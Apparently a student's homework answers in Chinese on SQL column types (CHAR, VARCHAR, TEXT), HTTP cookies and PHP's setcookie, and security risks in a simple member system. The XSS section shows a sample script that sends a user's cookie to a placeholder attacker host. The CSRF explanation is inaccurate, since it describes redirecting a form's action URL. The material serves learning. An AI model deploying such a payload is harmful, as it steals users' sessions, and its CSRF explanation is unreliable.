## 資料庫欄位型態 VARCHAR 跟 TEXT 的差別是什麼
1.char的長度固定，每個字節都會佔用空間，適合在身分證號碼跟手機號碼。
2.varchar可以設定最大長度，字節長度最大到65535，
3.text不可以設定長度，如果不知道最大長度，可以使用text

查詢速度快到慢：char>varchar>text


## Cookie 是什麼？在 HTTP 這一層要怎麼設定 Cookie，瀏覽器又是怎麼把 Cookie 帶去 Server 的？
http的協議本身是無記憶狀態的（stateless），因此無論是client端或者web伺服器端，每個網頁的每次request都是單獨的請求，因此可以藉由cookie 來讓用戶的各項操作產生連結。

cookie是指伺服器產生一個紀錄檔放在電腦上，讓不同request 產生關聯，再下次的request，伺服器可以先檢查有沒有上次留下的cookie資料，若是有cookie 檔案，可以根據cookie來判斷使用者，傳送特定網頁。
php可以使用setcookie這個function來設定cookie的key與value

## 我們本週實作的會員系統，你能夠想到什麼潛在的問題嗎？

1. XSS:
攻擊者得知網站A存在漏洞，在相應網頁植入惡意的script代碼。
`<script>window.open(www.xxx.com?cookie =xxx)</script> 
`
惡意代碼被執行，並將收集到的敏感信息（如cookie）發送到攻擊者伺服器。


若是沒有在伺服器那邊多寫一層認證，則會直接送出至伺服器。

2. CSRF
跨請求偽造，
刻意的導向到其他網址，例如這禮拜的作業：
 在留言輸入框的action可以更改URL網址，使得使用者送出後轉向其他網址！

